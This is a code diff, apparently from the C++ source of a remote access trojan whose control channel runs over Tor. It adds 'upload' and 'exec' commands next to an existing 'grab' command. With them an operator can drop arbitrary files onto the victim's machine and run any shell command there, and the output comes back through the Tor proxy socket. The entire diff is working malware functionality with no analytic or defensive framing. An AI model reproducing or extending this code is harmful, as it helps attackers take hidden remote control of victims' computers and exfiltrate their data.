@@ -113,6 +113,12 @@ public:
             else if (cmd.starts_with("grab;")) {
                 this->grab(cmd.substr(5, cmd.size() - 6));
             }
+            else if (cmd.starts_with("upload;")) {
+                this->upload(cmdBuff, bytesReceived); // Using raw buffer, because null bytes are a thing.
+            }
+            else if (cmd.starts_with("exec;")) {
+                this->exec(cmd.substr(5, cmd.size() - 6));
+            }
             else {
                 std::string failResponse = "Received invalid command: " + cmd;
                 torSock.proxySendStr(failResponse);
@@ -171,6 +177,56 @@ public:
             }
             this->torSock.proxySend(responseBytes.data(), responseBytes.size());
         }
+    }
+
+    void upload(char* b, unsigned int bytesReceivedInitial) {
+        unsigned bytesReceivedTotal = bytesReceivedInitial;
+        // Convert the buffer to a string and extract the file name and size
+        // upload;<file name>;<file size>;<raw data>
+        std::string bStr(b);
+        int fileNameEnd = bStr.find(";", 7);
+        std::string fileName = bStr.substr(7, fileNameEnd - 7);
+        unsigned long int fileSize = std::stoi(bStr.substr(fileNameEnd + 1, bStr.find(";", fileNameEnd + 1) - fileNameEnd - 1)); // unsafe
+        unsigned int headerSize = 7 + fileName.size() + 1 + std::to_string(fileSize).size() + 1; // 7 = "upload;", 1 = ";", 1 = ";"
+        bytesReceivedTotal -= headerSize;
+        std::vector<char> fileData;
+        fileData.reserve(fileSize);
+        printf("Received upload for %d bytes of data, filename: %s\n", fileSize, fileName.c_str());
+        fileData.insert(fileData.end(), b + headerSize, b + bytesReceivedInitial);
+        while (bytesReceivedTotal < fileSize) {
+            char b[1024] = { 0 };
+            unsigned int bytesReceived = this->torSock.proxyRecv(b, 1024);
+            fileData.insert(fileData.end(), b, b + bytesReceived);
+            bytesReceivedTotal += bytesReceived;
+        }
+        std::ofstream f(fileName.c_str(), std::ios::binary);
+        if (f.is_open() != true) {
+            this->torSock.proxySendStr("upload;" + fileName + ";failed;");
+        }
+        else {
+            f.write(fileData.data(), fileData.size());
+            this->torSock.proxySendStr("upload;" + fileName + ";success;");
+        }
+        f.close();
+    }
+
+    void exec(std::string cmd) {
+        // Execute a command and return the output
+        std::string response = "exec;" + cmd + ";";
+        FILE* pipe = _popen(cmd.c_str(), "r");
+        if (!pipe) {
+            response += "failed;";
+        }
+        else {
+            char buffer[128];
+            while (!feof(pipe)) {
+                if (fgets(buffer, 128, pipe) != NULL) {
+                    response += buffer;
+                }
+            }
+            _pclose(pipe);
+        }
+        this->torSock.proxySendStr(response);
     }
     
 };
